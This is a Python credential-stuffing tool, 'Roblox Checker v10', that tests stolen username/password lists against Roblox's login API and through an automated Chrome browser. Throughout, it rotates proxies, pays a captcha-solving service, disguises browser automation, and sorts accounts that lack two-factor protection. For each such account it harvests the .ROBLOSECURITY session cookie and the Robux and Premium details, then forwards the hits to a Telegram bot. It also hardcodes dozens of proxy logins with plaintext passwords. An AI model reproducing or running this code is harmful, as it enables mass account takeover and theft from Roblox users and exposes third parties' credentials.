# ============================================================
# ROBLOX CHECKER v10
# 1 API fast check (pass + NO 2FA)
# 2 API + optional 2Captcha (key empty = skip captcha)
# 3 Chrome browser (built-in) — human login, optional captcha key
# 4 Telegram notify
# 5 Exit
# Colors: HIT/NO2FA/Premium/Robux = green | 2FA = red | CAP = yellow
# ============================================================

import requests
import threading
import sys
import time
import os
import random
import json
from datetime import datetime
from queue import Queue, Empty
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed

init(autoreset=True)

def ua():
    return random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Roblox/WinInet",
    ])

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    print(f"""
{Fore.CYAN}{'='*62}
{Fore.YELLOW}  ROBLOX CHECKER v10
{Fore.GREEN}  HIT/NO2FA/Premium/Robux = GREEN   {Fore.RED}2FA = RED   {Fore.YELLOW}CAPTCHA = YELLOW
{Fore.CYAN}{'='*62}{Style.RESET_ALL}
""")

OWNER_PROXIES = [
    "proxy.commandor.my.id:10000:user_kzAlTx5N-1:1f6bb3b4aa7f",
    "proxy.commandor.my.id:10000:user_kzAlTx5N-2:1f6bb3b4aa7f",
    "proxy.commandor.my.id:10000:user_kzAlTx5N-3:1f6bb3b4aa7f",
    "proxy.commandor.my.id:10000:user_kzAlTx5N-4:1f6bb3b4aa7f",
    "proxy.commandor.my.id:10000:user_kzAlTx5N-5:1f6bb3b4aa7f",
    "103.204.108.142:12345:naveed:Qwerty_123ABC",
    "us7.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us7.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "us2.cactussstp.com:3129:hughmuir2:lisamarie11",
    "196.244.48.26:12345:naveed:Qwerty_123ABC",
    "196.244.48.126:12345:naveed:Qwerty_123ABC",
    "us2.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us3.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us3.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us2.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us3.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us4.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "za-joh.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "us4.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "es1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "uk2.cactussstp.com:3129:hughmuir2:lisamarie11",
    "uk3.cactussstp.com:81:hughmuir2:lisamarie11",
    "ca1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "uk2.cactussstp.com:8080:bvmbsmie:shibby2511",
    "be-bru.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "uk3.cactussstp.com:3129:hughmuir2:lisamarie11",
    "uk2.cactussstp.com:81:hughmuir2:lisamarie11",
    "uk2.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "ca1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "uk3.cactussstp.com:81:bvmbsmie:shibby2511",
    "uk3.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "ch1.cactussstp.com:81:bvmbsmie:shibby2511",
    "ro1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "ch1.cactussstp.com:81:hughmuir2:lisamarie11",
    "uk3.cactussstp.com:8080:bvmbsmie:shibby2511",
    "ro1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "uk2.cactussstp.com:8080:hughmuir2:lisamarie11",
    "uk3.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "ro1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us7.cactussstp.com:3129:hughmuir2:lisamarie11",
    "ca1.cactussstp.com:81:hughmuir2:lisamarie11",
    "ro1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "ro1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "it1.cactussstp.com:81:bvmbsmie:shibby2511",
    "ch1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "103.183.121.59:34219:y7g4dd8d:Buw96jtGFKA5",
    "it-mil.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "202.41.171.9:2086:1101400099291:mooyor4556",
    "206.189.139.234:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ca-van.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
]

ROBLOX_FUNCAPTCHA_PK = "A2A14B1D-1AF3-C791-9BBC-EE33CC7A0A6F"
ROBLOX_FUNCAPTCHA_PAGE = "https://www.roblox.com/login"

use_proxy = False
combo_path = ""
lock = threading.Lock()
combo_q = Queue()
proxy_q = Queue()
proxy_count = 0
total_combo = 0
processed = set()
proxy_fails = {}
DEAD_FAILS = 4
valid_proxies = []
captcha_key = ""  # empty = skip captcha (no solve)
tg_token = ""
tg_chat_id = ""
results_dir = ""
files = {}
st = {"hit": 0, "twofa": 0, "captcha": 0, "bad": 0, "retry": 0, "nf": 0, "dead": 0, "premium": 0, "robux": 0}

def setup_results(tag):
    global results_dir, files
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    results_dir = f"results_rbx/{tag}_{ts}"
    os.makedirs(results_dir, exist_ok=True)
    files = {
        "hit": os.path.join(results_dir, "HIT_NO2FA.txt"),
        "twofa": os.path.join(results_dir, "2FA.txt"),
        "captcha": os.path.join(results_dir, "CAPTCHA.txt"),
        "bad": os.path.join(results_dir, "BAD.txt"),
        "retry": os.path.join(results_dir, "RETRY.txt"),
        "premium": os.path.join(results_dir, "PREMIUM_HITS.txt"),
        "robux": os.path.join(results_dir, "ROBUX_HITS.txt"),
        "cookies": os.path.join(results_dir, "COOKIES.txt"),
        "full": os.path.join(results_dir, "FULL_CAPTURE.txt"),
        "dead": os.path.join(results_dir, "Dead_Proxies.txt"),
        "nf": os.path.join(results_dir, "NotFound.txt"),
    }

def form_proxy(proxy):
    if not proxy:
        return None
    proxy = proxy.strip()
    try:
        low = proxy.lower()
        if low.startswith(("http://", "https://", "socks5://", "socks5h://")):
            return {"http": proxy, "https": proxy}
        if "@" in proxy:
            auth, host = proxy.rsplit("@", 1)
            url = f"http://{auth}@{host}"
            return {"http": url, "https": url}
        parts = proxy.split(":")
        if len(parts) == 2:
            url = f"http://{parts[0]}:{parts[1]}"
            return {"http": url, "https": url}
        if len(parts) >= 4:
            host, port, user = parts[0], parts[1], parts[2]
            pwd = ":".join(parts[3:])
            if port.isdigit():
                url = f"http://{user}:{pwd}@{host}:{port}"
                return {"http": url, "https": url}
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    except Exception:
        return None

def test_proxy(p):
    px = form_proxy(p)
    if not px:
        return None
    try:
        r = requests.get("https://users.roblox.com/v1/users/1", proxies=px, timeout=8, headers={"User-Agent": ua()})
        if r.status_code in (200, 429):
            return p
    except Exception:
        pass
    return None

def validate_proxies(raw):
    global valid_proxies, proxy_count
    print(f"{Fore.YELLOW}Validating {len(raw)} proxies...{Style.RESET_ALL}")
    ok = []
    with ThreadPoolExecutor(max_workers=min(30, max(1, len(raw)))) as ex:
        for fut in as_completed({ex.submit(test_proxy, p): p for p in raw}):
            r = fut.result()
            if r:
                ok.append(r)
    valid_proxies = ok
    proxy_count = len(ok)
    while not proxy_q.empty():
        try:
            proxy_q.get_nowait()
        except Exception:
            break
    for p in ok:
        proxy_q.put(p)
    print(f"{Fore.GREEN}Valid proxies: {proxy_count}/{len(raw)}{Style.RESET_ALL}")
    return ok

def get_proxy():
    if not use_proxy or proxy_q.empty():
        return None
    for _ in range(min(20, max(1, proxy_q.qsize()))):
        p = proxy_q.get()
        if proxy_fails.get(p, 0) < DEAD_FAILS:
            proxy_q.put(p)
            return p
    return None

def mark_fail(p):
    if not p:
        return
    with lock:
        proxy_fails[p] = proxy_fails.get(p, 0) + 1
        if proxy_fails[p] == DEAD_FAILS:
            st["dead"] += 1
            try:
                with open(files.get("dead", "dead.txt"), "a") as f:
                    f.write(p + "\n")
            except Exception:
                pass

def load_combos():
    global total_combo
    total_combo = 0
    lines = []
    for enc in ("utf-8", "latin-1", "cp1252"):
        try:
            with open(combo_path, "r", encoding=enc, errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if "|" in line:
                        line = line.split("|", 1)[0].strip()
                    if ":" in line:
                        lines.append(line)
            break
        except Exception:
            continue
    for ln in lines:
        combo_q.put(ln)
    total_combo = len(lines)
    return lines

def save(key, line):
    path = files.get(key)
    if not path:
        return
    with lock:
        try:
            with open(path, "a", encoding="utf-8") as f:
                f.write(line + "\n")
        except Exception:
            pass

def tg_send(text):
    if not tg_token or not tg_chat_id:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{tg_token}/sendMessage",
            json={"chat_id": tg_chat_id, "text": text[:3500]},
            timeout=10,
        )
    except Exception:
        pass

def stats():
    sys.stdout.write(
        f"\r {Fore.GREEN}HIT:{st['hit']}{Fore.WHITE} Prem:{st['premium']} Robux:{st['robux']} | "
        f"{Fore.RED}2FA:{st['twofa']}{Fore.WHITE} | {Fore.YELLOW}CAP:{st['captcha']}{Fore.WHITE} | "
        f"BAD:{st['bad']} Left:{combo_q.qsize()}   "
    )
    sys.stdout.flush()

def print_hit(name, robux, prem, extra=""):
    parts = [f"{Fore.GREEN}[HIT NO-2FA]{Style.RESET_ALL} {Fore.GREEN}{name}{Style.RESET_ALL}"]
    if prem == "Yes":
        parts.append(f"{Fore.GREEN}Premium=Yes{Style.RESET_ALL}")
        with lock:
            st["premium"] += 1
    else:
        parts.append(f"Premium={prem}")
    if isinstance(robux, int):
        if robux > 0:
            parts.append(f"{Fore.GREEN}Robux={robux}{Style.RESET_ALL}")
            with lock:
                st["robux"] += 1
        else:
            parts.append(f"Robux={robux}")
    else:
        parts.append(f"Robux={robux}")
    if extra:
        parts.append(extra)
    print("\n" + " | ".join(parts))

def print_2fa(name):
    print(f"\n{Fore.RED}[2FA] {name}{Style.RESET_ALL}")

def get_csrf(session):
    try:
        r = session.post("https://auth.roblox.com/v2/login", json={}, timeout=9)
        return r.headers.get("x-csrf-token") or r.headers.get("X-CSRF-TOKEN")
    except Exception:
        return None

def public_premium(session, user_id, proxies=None):
    prem, lim, rap = "?", 0, 0
    try:
        r = session.get(
            f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership",
            timeout=6, proxies=proxies,
        )
        if r.status_code == 200:
            j = r.json() if r.text else {}
            prem = "Yes" if j.get("isPremium") or "true" in (r.text or "").lower() else "No"
    except Exception:
        pass
    try:
        r = session.get(
            f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=50&sortOrder=Asc",
            timeout=8, proxies=proxies,
        )
        if r.status_code == 200:
            items = r.json().get("data") or []
            lim = len(items)
            rap = sum(int(i.get("recentAveragePrice") or 0) for i in items)
    except Exception:
        pass
    return prem, lim, rap

def auth_capture(session, user_id):
    robux, prem, cookie = "?", "?", ""
    try:
        r = session.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", timeout=8)
        if r.status_code == 200:
            robux = r.json().get("robux", 0)
    except Exception:
        pass
    try:
        r = session.get(
            f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership", timeout=6
        )
        if r.status_code == 200:
            j = r.json() if r.text else {}
            prem = "Yes" if j.get("isPremium") or "true" in (r.text or "").lower() else "No"
    except Exception:
        pass
    cookie = session.cookies.get(".ROBLOSECURITY") or session.cookies.get("ROBLOSECURITY") or ""
    return robux, prem, cookie

def solve_2captcha(api_key):
    if not api_key:
        return None
    try:
        r = requests.post("http://2captcha.com/in.php", data={
            "key": api_key, "method": "funcaptcha",
            "publickey": ROBLOX_FUNCAPTCHA_PK, "pageurl": ROBLOX_FUNCAPTCHA_PAGE, "json": 1,
        }, timeout=30)
        j = r.json()
        if j.get("status") != 1:
            return None
        rid = j.get("request")
        for _ in range(36):
            time.sleep(5)
            res = requests.get("http://2captcha.com/res.php",
                               params={"key": api_key, "action": "get", "id": rid, "json": 1}, timeout=20)
            jj = res.json()
            if jj.get("status") == 1:
                return jj.get("request")
            if jj.get("request") != "CAPCHA_NOT_READY":
                return None
    except Exception:
        pass
    return None

def login_api(login_id, password, proxies=None, raw_proxy=None):
    """use captcha_key global: if set try solve, else skip on captcha."""
    session = requests.Session()
    if proxies:
        session.proxies = proxies
    session.headers.update({
        "User-Agent": ua(), "Content-Type": "application/json", "Accept": "application/json",
        "Origin": "https://www.roblox.com", "Referer": "https://www.roblox.com/login",
    })
    try:
        csrf = get_csrf(session)
        if not csrf:
            mark_fail(raw_proxy)
            return "retry", {}, None
        session.headers["X-CSRF-TOKEN"] = csrf
        payloads = [{"ctype": "Username", "cvalue": login_id, "password": password}]
        if "@" in login_id:
            payloads.insert(0, {"ctype": "Email", "cvalue": login_id, "password": password})

        for payload in payloads:
            resp = session.post("https://auth.roblox.com/v2/login", json=payload, timeout=14)
            if resp.status_code == 403 and resp.headers.get("x-csrf-token"):
                session.headers["X-CSRF-TOKEN"] = resp.headers["x-csrf-token"]
                resp = session.post("https://auth.roblox.com/v2/login", json=payload, timeout=14)
            try:
                data = resp.json()
            except Exception:
                data = {}
            text = (resp.text or "").lower()
            cookies = session.cookies.get_dict()
            headers_l = {k.lower(): v for k, v in resp.headers.items()}

            if resp.status_code == 200 and ("user" in data or ".ROBLOSECURITY" in cookies or data.get("user")):
                user = data.get("user") or {}
                return "hit", {"id": user.get("id") or data.get("id"), "name": user.get("name") or login_id}, session

            if "twostepverification" in text or data.get("twoStepVerificationData") or data.get("twoStepVerificationMediaType"):
                return "2fa", {}, None

            ch_id = headers_l.get("rblx-challenge-id") or data.get("challengeId")
            ch_type = (headers_l.get("rblx-challenge-type") or "").lower()
            ch_meta = headers_l.get("rblx-challenge-metadata") or ""
            errors = data.get("errors") or []
            err_msg = str(errors[0].get("message", "")).lower() if errors else ""
            is_cap = bool(ch_id or "captcha" in ch_type or "captcha" in err_msg or "robot" in err_msg)

            if is_cap:
                if captcha_key:
                    token = solve_2captcha(captcha_key)
                    if token:
                        session.headers["rblx-challenge-id"] = ch_id or ""
                        session.headers["rblx-challenge-type"] = ch_type or "captcha"
                        session.headers["rblx-challenge-metadata"] = ch_meta
                        p2 = dict(payload)
                        p2["captchaToken"] = token
                        p2["captchaProvider"] = "PROVIDER_ARKOSE_LABS"
                        resp2 = session.post("https://auth.roblox.com/v2/login", json=p2, timeout=16)
                        try:
                            d2 = resp2.json()
                        except Exception:
                            d2 = {}
                        if resp2.status_code == 200 and ("user" in d2 or ".ROBLOSECURITY" in session.cookies.get_dict()):
                            user = d2.get("user") or {}
                            return "hit", {"id": user.get("id"), "name": user.get("name") or login_id}, session
                        if "twostepverification" in (resp2.text or "").lower() or d2.get("twoStepVerificationData"):
                            return "2fa", {}, None
                return "captcha", {}, None  # skip if no key or solve failed

            if resp.status_code in (401, 403) or "incorrect" in err_msg or "invalid" in err_msg:
                continue
            if resp.status_code >= 500 or resp.status_code == 429:
                mark_fail(raw_proxy)
                return "retry", {}, None
        return "bad", {}, None
    except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout,
            requests.exceptions.ReadTimeout, requests.exceptions.ConnectionError,
            requests.exceptions.SSLError):
        mark_fail(raw_proxy)
        return "retry", {}, None
    except Exception:
        return "retry", {}, None

def parse_line(line):
    line = line.strip()
    if "|" in line:
        line = line.split("|", 1)[0].strip()
    if ":" not in line:
        return None, None, line
    a, b = line.split(":", 1)
    return a.strip(), b.strip(), line

def resolve_id(session, left, proxies=None):
    if left.isdigit():
        return int(left), left
    try:
        r = session.post(
            "https://users.roblox.com/v1/usernames/users",
            json={"usernames": [left], "excludeBannedUsers": False},
            timeout=12, proxies=proxies,
        )
        if r.status_code == 200:
            data = r.json().get("data") or []
            if data:
                return data[0].get("id"), data[0].get("name")
    except Exception:
        pass
    return None, None

def handle_hit(raw, info, login_sess, prem_pub, lim, rap):
    rid = info.get("id")
    name = info.get("name") or ""
    robux, prem, cookie = "?", prem_pub, ""
    if login_sess and rid:
        robux, prem, cookie = auth_capture(login_sess, rid)
    out = (
        f"{raw} | name={name} | id={rid} | RealRobux={robux} | Premium={prem} | "
        f"Limiteds={lim} RAP={rap} | NO_2FA"
    )
    with lock:
        st["hit"] += 1
    save("hit", out)
    if prem == "Yes":
        save("premium", out)
    if isinstance(robux, int) and robux > 0:
        save("robux", out)
    if cookie:
        save("cookies", f"{raw} | {cookie}")
        save("full", out + " | COOKIE_OK")
    print_hit(name or raw.split(":")[0], robux, prem, f"Lim={lim} RAP={rap}")
    tg_send(f"HIT NO-2FA\n{name}\nRobux={robux} Premium={prem}\n{raw}")

def worker_api():
    session = requests.Session()
    session.headers.update({"User-Agent": ua(), "Accept": "application/json"})
    while True:
        try:
            line = combo_q.get(timeout=1)
        except Empty:
            break
        with lock:
            if line in processed:
                combo_q.task_done()
                stats()
                continue
            processed.add(line)
        left, password, raw = parse_line(line)
        if not left or not password:
            combo_q.task_done()
            continue

        raw_px = get_proxy() if use_proxy else None
        proxies = form_proxy(raw_px) if raw_px else None
        session.proxies = proxies or {}

        uid, uname = resolve_id(session, left, proxies)
        prem_pub, lim, rap = "?", 0, 0
        if uid:
            prem_pub, lim, rap = public_premium(session, uid, proxies)
        elif "@" not in left and not left.isdigit():
            with lock:
                st["nf"] += 1
            save("nf", raw)
            stats()
            combo_q.task_done()
            continue

        status, info, login_sess = login_api(left, password, proxies, raw_px)
        if status == "hit":
            if not info.get("name") and uname:
                info["name"] = uname
            if not info.get("id") and uid:
                info["id"] = uid
            handle_hit(raw, info, login_sess, prem_pub, lim, rap)
        elif status == "2fa":
            with lock:
                st["twofa"] += 1
            save("twofa", f"{raw} | PremiumPub={prem_pub} Lim={lim} RAP={rap}")
            print_2fa(left)
        elif status == "captcha":
            with lock:
                st["captcha"] += 1
            save("captcha", raw)
        elif status == "bad":
            with lock:
                st["bad"] += 1
            save("bad", raw)
        else:
            with lock:
                st["retry"] += 1
            save("retry", raw)
        stats()
        combo_q.task_done()
        time.sleep(random.uniform(0.04, 0.14))

def selenium_check_one(login_id, password, proxy_raw=None):
    """
    Returns: status, detail_dict
    status: hit | 2fa | bad | captcha | error
    On hit: may include cookie string and try robux via requests session
    """
    try:
        from selenium import webdriver
        from selenium.webdriver.common.by import By
        from selenium.webdriver.chrome.options import Options
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
        from selenium.webdriver.common.keys import Keys
    except ImportError:
        return "error", {"msg": "pip install selenium"}

    opts = Options()
    opts.add_argument("--disable-blink-features=AutomationControlled")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--window-size=1100,800")
    opts.add_argument(f"--user-agent={ua()}")
    opts.add_experimental_option("excludeSwitches", ["enable-automation"])
    opts.add_experimental_option("useAutomationExtension", False)
    # headless more captcha — keep visible by default
    # opts.add_argument("--headless=new")

    if proxy_raw:
        parts = proxy_raw.split(":")
        if len(parts) >= 2 and parts[1].isdigit():
            opts.add_argument(f"--proxy-server=http://{parts[0]}:{parts[1]}")

    driver = None
    try:
        driver = webdriver.Chrome(options=opts)
        try:
            driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
                "source": "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})"
            })
        except Exception:
            pass
        driver.set_page_load_timeout(45)
        driver.get("https://www.roblox.com/login")
        time.sleep(random.uniform(1.8, 3.2))
        wait = WebDriverWait(driver, 22)

        user_el = wait.until(EC.presence_of_element_located((By.ID, "login-username")))
        pass_el = driver.find_element(By.ID, "login-password")
        for ch in login_id:
            user_el.send_keys(ch)
            time.sleep(random.uniform(0.02, 0.08))
        time.sleep(random.uniform(0.25, 0.6))
        for ch in password:
            pass_el.send_keys(ch)
            time.sleep(random.uniform(0.02, 0.07))
        time.sleep(random.uniform(0.3, 0.7))
        driver.find_element(By.ID, "login-button").click()
        time.sleep(random.uniform(3.5, 5.5))

        page = driver.page_source.lower()
        url = driver.current_url.lower()

        if "twostepverification" in page or "two-step" in page or "2-step verification" in page:
            return "2fa", {}

        if "incorrect username or password" in page or "invalid username or password" in page:
            return "bad", {}

        if "captcha" in page or "arkose" in page or "funcaptcha" in page or "challenge" in url:
            # optional: if captcha_key, user could solve manually in open browser window
            # we wait a bit in case user/key solves
            if captcha_key:
                time.sleep(15)  # wait room for external solve / manual
                page = driver.page_source.lower()
                url = driver.current_url.lower()
                if "twostepverification" in page:
                    return "2fa", {}
                if "home" in url:
                    pass  # fall through to hit
                else:
                    return "captcha", {}
            else:
                return "captcha", {}

        if "home" in url or "/home" in url or "www.roblox.com/home" in url or "roblox.com/discover" in url:
            cookies = driver.get_cookies()
            cookie_str = ""
            for c in cookies:
                if c.get("name") == ".ROBLOSECURITY":
                    cookie_str = c.get("value") or ""
                    break
            robux, prem = "?", "?"
            # use cookie with requests for real robux
            if cookie_str:
                s = requests.Session()
                s.cookies.set(".ROBLOSECURITY", cookie_str, domain=".roblox.com")
                s.headers.update({"User-Agent": ua()})
                # need user id
                try:
                    r = s.get("https://users.roblox.com/v1/users/authenticated", timeout=10)
                    if r.status_code == 200:
                        uid = r.json().get("id")
                        name = r.json().get("name")
                        robux, prem, _ = auth_capture(s, uid)
                        return "hit", {"id": uid, "name": name, "cookie": cookie_str, "robux": robux, "premium": prem}
                except Exception:
                    pass
            return "hit", {"cookie": cookie_str, "robux": robux, "premium": prem}

        if "incorrect" in page or "invalid" in page:
            return "bad", {}
        return "captcha", {}
    except Exception as e:
        return "error", {"msg": str(e)[:150]}
    finally:
        if driver:
            try:
                driver.quit()
            except Exception:
                pass

def worker_chrome():
    while True:
        try:
            line = combo_q.get(timeout=1)
        except Empty:
            break
        with lock:
            if line in processed:
                combo_q.task_done()
                stats()
                continue
            processed.add(line)
        left, password, raw = parse_line(line)
        if not left or not password:
            combo_q.task_done()
            continue
        raw_px = get_proxy() if use_proxy else None
        status, info = selenium_check_one(left, password, raw_px)

        if status == "hit":
            name = info.get("name") or left
            robux = info.get("robux", "?")
            prem = info.get("premium", "?")
            cookie = info.get("cookie", "")
            out = f"{raw} | name={name} | id={info.get('id')} | RealRobux={robux} | Premium={prem} | NO_2FA | chrome"
            with lock:
                st["hit"] += 1
            save("hit", out)
            if prem == "Yes":
                save("premium", out)
            if isinstance(robux, int) and robux > 0:
                save("robux", out)
            if cookie:
                save("cookies", f"{raw} | {cookie}")
                save("full", out + " | COOKIE_OK")
            print_hit(name, robux, prem, "chrome")
            tg_send(f"HIT NO-2FA (Chrome)\n{name}\nRobux={robux} Premium={prem}\n{raw}")
        elif status == "2fa":
            with lock:
                st["twofa"] += 1
            save("twofa", raw)
            print_2fa(left)
        elif status == "captcha":
            with lock:
                st["captcha"] += 1
            save("captcha", raw)
            print(f"\n{Fore.YELLOW}[CAPTCHA skip] {left}{Style.RESET_ALL}")
        elif status == "bad":
            with lock:
                st["bad"] += 1
            save("bad", raw)
        else:
            with lock:
                st["retry"] += 1
            save("retry", f"{raw} | {info.get('msg', '')}")
        stats()
        combo_q.task_done()
        time.sleep(random.uniform(1.2, 2.8))

def pick_proxy():
    global use_proxy
    print(f"\n{Fore.WHITE}Proxy:")
    print(f"[{Fore.GREEN}1{Fore.WHITE}] Owner (validate)")
    print(f"[{Fore.GREEN}2{Fore.WHITE}] Proxy file")
    print(f"[{Fore.GREEN}3{Fore.WHITE}] Proxyless")
    c = input(f"{Fore.YELLOW}> {Fore.WHITE}").strip()
    if c == "1":
        use_proxy = True
        return bool(validate_proxies(list(OWNER_PROXIES)))
    if c == "2":
        path = input(f"{Fore.YELLOW}> Proxy file: {Fore.WHITE}").strip().strip('"').strip("'")
        if not os.path.isfile(path):
            print(f"{Fore.RED}Not found{Style.RESET_ALL}")
            return False
        raw = []
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    raw.append(line)
        use_proxy = True
        return bool(validate_proxies(raw))
    if c == "3":
        use_proxy = False
        return True
    return False

def pick_combo():
    global combo_path
    combo_path = input(f"{Fore.YELLOW}> Combo (user:pass / email:pass): {Fore.WHITE}").strip().strip('"').strip("'")
    if not os.path.isfile(combo_path):
        print(f"{Fore.RED}File not found{Style.RESET_ALL}")
        return False
    load_combos()
    print(f"{Fore.GREEN}Combos: {total_combo}{Style.RESET_ALL}")
    return total_combo > 0

def ask_threads(default):
    print(f"{Fore.CYAN}Suggested threads: {default}{Style.RESET_ALL}")
    raw = input(f"{Fore.YELLOW}> Threads [Enter={default}]: {Fore.WHITE}").strip()
    if not raw:
        return default
    try:
        return max(1, min(300, int(raw)))
    except Exception:
        return default

def ask_captcha_optional():
    global captcha_key
    print(f"{Fore.WHITE}2Captcha key optional — empty = skip captcha lines{Style.RESET_ALL}")
    captcha_key = input(f"{Fore.YELLOW}> 2Captcha key [Enter=skip]: {Fore.WHITE}").strip()
    if captcha_key:
        print(f"{Fore.GREEN}Solver ON{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}Solver OFF — captcha will be skipped to CAPTCHA.txt{Style.RESET_ALL}")

def reset():
    for k in st:
        st[k] = 0
    processed.clear()
    while not combo_q.empty():
        try:
            combo_q.get_nowait()
        except Exception:
            break

def run_workers(tag, fn, threads):
    setup_results(tag)
    print(f"{Fore.CYAN}Threads: {threads} -> {results_dir}\n{Style.RESET_ALL}")
    ths = []
    for _ in range(threads):
        t = threading.Thread(target=fn)
        t.daemon = True
        ths.append(t)
        t.start()
    for t in ths:
        t.join()
    print(f"""
{Fore.GREEN}DONE -> {results_dir}
  {Fore.GREEN}HIT NO-2FA: {st['hit']}{Style.RESET_ALL}
  {Fore.GREEN}Premium hits: {st['premium']} | Robux>0: {st['robux']}{Style.RESET_ALL}
  {Fore.RED}2FA: {st['twofa']}{Style.RESET_ALL}
  {Fore.YELLOW}CAPTCHA skipped: {st['captcha']}{Style.RESET_ALL}
  BAD: {st['bad']} | RETRY: {st['retry']}
""")

def setup_telegram():
    global tg_token, tg_chat_id
    tok = input(f"{Fore.YELLOW}> Bot token [Enter skip]: {Fore.WHITE}").strip()
    if not tok:
        tg_token = tg_chat_id = ""
        return
    tg_token = tok
    cid = input(f"{Fore.YELLOW}> Chat ID (or /start bot then Enter): {Fore.WHITE}").strip()
    if cid:
        tg_chat_id = cid
    else:
        try:
            r = requests.get(f"https://api.telegram.org/bot{tg_token}/getUpdates", timeout=15)
            data = r.json().get("result") or []
            if data:
                tg_chat_id = str(data[-1]["message"]["chat"]["id"])
                print(f"{Fore.GREEN}Chat ID: {tg_chat_id}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}Send /start to bot first{Style.RESET_ALL}")
                tg_token = ""
                return
        except Exception:
            tg_token = ""
            return
    tg_send("Roblox checker online")
    print(f"{Fore.GREEN}Telegram OK{Style.RESET_ALL}")

if __name__ == "__main__":
    clear()
    banner()
    while True:
        print(f"{Fore.WHITE}[{Fore.GREEN}1{Fore.WHITE}] API fast — user/email:pass")
        print(f"    {Fore.GREEN}HIT{Style.RESET_ALL}=pass OK+NO 2FA  {Fore.RED}2FA{Style.RESET_ALL}  {Fore.YELLOW}CAP skip{Style.RESET_ALL}")
        print(f"[{Fore.GREEN}2{Fore.WHITE}] API + optional 2Captcha key (empty=skip captcha)")
        print(f"[{Fore.GREEN}3{Fore.WHITE}] Chrome browser built-in (desktop)")
        print(f"    Types id/pass in real Chrome, reads 2FA / Robux / Premium")
        print(f"[{Fore.GREEN}4{Fore.WHITE}] Telegram bot token")
        print(f"[{Fore.GREEN}5{Fore.WHITE}] {Fore.RED}Exit{Style.RESET_ALL}\n")
        try:
            c = input(f"{Fore.YELLOW}> Select: {Fore.WHITE}").strip()
        except KeyboardInterrupt:
            sys.exit(0)
        if c == "5":
            print("Bye")
            sys.exit(0)
        if c == "4":
            setup_telegram()
            input(f"{Fore.YELLOW}Enter...{Style.RESET_ALL}")
            clear()
            banner()
            continue
        if c not in ("1", "2", "3"):
            continue

        reset()
        if not pick_proxy() or not pick_combo():
            input(f"{Fore.YELLOW}Enter...{Style.RESET_ALL}")
            clear()
            banner()
            continue

        if c == "1":
            captcha_key = ""
            th = ask_threads(80 if not use_proxy else min(120, max(20, proxy_count * 2)))
            run_workers("api", worker_api, th)
        elif c == "2":
            ask_captcha_optional()
            th = ask_threads(30 if captcha_key else 80)
            run_workers("api_cap", worker_api, th)
        elif c == "3":
            print(f"{Fore.YELLOW}Need: PC + Chrome +  pip install selenium{Style.RESET_ALL}")
            ask_captcha_optional()
            th = ask_threads(1)  # chrome best 1-2
            run_workers("chrome", worker_chrome, min(th, 3))

        input(f"{Fore.YELLOW}Enter menu...{Style.RESET_ALL}")
        clear()
        banner()
